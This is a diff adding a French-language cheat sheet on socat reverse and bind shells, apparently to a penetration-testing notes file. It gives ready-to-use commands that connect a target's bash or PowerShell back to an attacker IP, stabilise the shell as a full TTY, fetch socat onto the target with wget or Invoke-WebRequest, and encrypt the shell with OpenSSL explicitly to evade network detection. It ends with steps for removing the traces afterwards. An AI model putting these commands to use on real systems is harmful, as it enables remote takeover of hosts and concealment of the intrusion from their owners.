@@ -285,5 +285,175 @@ export TERM=xterm
 # Ctrl+Z
 stty raw -echo; fg
 ```
+# 🔌 Socat Reverse & Bind Shells - Cheat Sheet
+
+**Socat** = netcat ++  
+Un outil puissant pour établir des connexions stables, interactives et TTY-friendly.
+
+---
+
+## 🔁 Reverse Shells avec Socat
+
+### 🎧 Listener (Attaquant) :
+```bash
+socat TCP-L:<port> -
+```
+
+### 📤 Cible Linux :
+```bash
+socat TCP:<attacker-ip>:<port> EXEC:"bash -li"
+```
+
+### 📤 Cible Windows :
+```bash
+socat TCP:<attacker-ip>:<port> EXEC:powershell.exe,pipes
+```
+
+---
+
+## 🔗 Bind Shells avec Socat
+
+### 🎧 Listener Windows :
+```bash
+socat TCP-L:<port> EXEC:powershell.exe,pipes
+```
+
+### 🎧 Listener Linux :
+```bash
+socat TCP-L:<port> EXEC:"bash -li"
+```
+
+### 💻 Connexion (Attaquant) :
+```bash
+socat TCP:<target-ip>:<port> -
+```
+
+---
+
+## 💡 Shell Linux Full TTY (Stabilisé)
+
+### ✅ Étapes :
+
+#### 🎧 Listener spécial (Attaquant) :
+```bash
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+```
+
+#### 📤 Commande spéciale (Cible Linux) :
+```bash
+socat TCP:<attacker-ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+### 🧩 Détails des options :
+
+- `pty` : alloue un pseudo-terminal
+- `stderr` : permet l'affichage des erreurs
+- `sigint` : accepte les Ctrl+C
+- `setsid` : crée un nouveau session group
+- `sane` : restaure un terminal "propre"
+
+---
+
+## 📦 Upload de Socat (si non présent sur la cible)
+
+### 🖥️ Sur la machine d’attaque :
+```bash
+sudo python3 -m http.server 80
+```
+
+### 📥 Sur la cible :
+```bash
+# Linux
+wget http://<attacker-ip>/socat -O /tmp/socat
+chmod +x /tmp/socat
+
+# Windows (PowerShell)
+Invoke-WebRequest -Uri http://<attacker-ip>/socat.exe -OutFile C:\Windows\Temp\socat.exe
+```
+
+---
+
+## 📏 Ajuster dimensions du terminal
+
+```bash
+# Depuis un terminal local
+stty -a  # puis repérez rows et cols
+
+# Depuis le shell distant
+stty rows <valeur>
+stty cols <valeur>
+```
+
+---
+
+## 🐞 Debug Socat
+
+Ajoutez `-d -d` pour plus de verbosité :
+```bash
+socat -d -d TCP-L:<port> FILE:`tty`,raw,echo=0
+```
+---
+
+# 🔧 Astuces Socat Supplémentaires
+
+## 🧪 Socat avec chiffrement (SSL)
+
+Chiffrer les communications avec OpenSSL pour éviter une détection facile.
+
+### 🎧 Listener chiffré :
+```bash
+socat OPENSSL-LISTEN:<port>,cert=cert.pem,key=key.pem,verify=0 FILE:`tty`,raw,echo=0
+```
+
+### 📤 Reverse shell chiffré :
+```bash
+socat OPENSSL:<attacker-ip>:<port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+⚠️ Nécessite un certificat SSL (`cert.pem`) et clé (`key.pem`) générés sur l'attaquant.
+
+---
+
+## 🧹 Nettoyage après l’exploitation
+
+Une fois que vous avez terminé, **supprimez Socat de la cible** :
+
+```bash
+rm /tmp/socat
+```
+
+Ou, sur Windows :
+
+```powershell
+Remove-Item C:\Windows\Temp\socat.exe
+```
+
+---
+
+## 🔁 Comparaison Netcat vs Socat
+
+| Fonction                  | Netcat            | Socat                            |
+|---------------------------|-------------------|----------------------------------|
+| Shells interactifs        | ❌ (non-TTY)       | ✅ (avec `pty`)                  |
+| Chiffrement               | ❌                 | ✅ (via OpenSSL)                 |
+| Multi-protocole           | ❌ (TCP/UDP)       | ✅ (TCP, UDP, SSL, etc.)         |
+| Facilité de syntaxe       | ✅ (simple)        | ❌ (plus verbeux)                |
+| Disponibilité système     | ✅ (souvent dispo) | ❌ (rarement préinstallé)        |
+| Windows compatibility     | ✅ (basique)       | ✅ (avec version .exe adaptée)   |
+
+---
+
+## 📚 Références utiles
+
+- [PayloadsAllTheThings - Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)
+- [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- Kali Linux Web Shells: `/usr/share/webshells/`
+- Socat Binary Precompiled: [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
+
+---
+
+✅ **TL;DR : Socat = Shell TTY propre, flexible, multi-protocole.**  
+📦 **Uploade-le sur la cible si pas présent.**  
+🔐 **Ajoute SSL pour éviter détection réseau.**
 
 
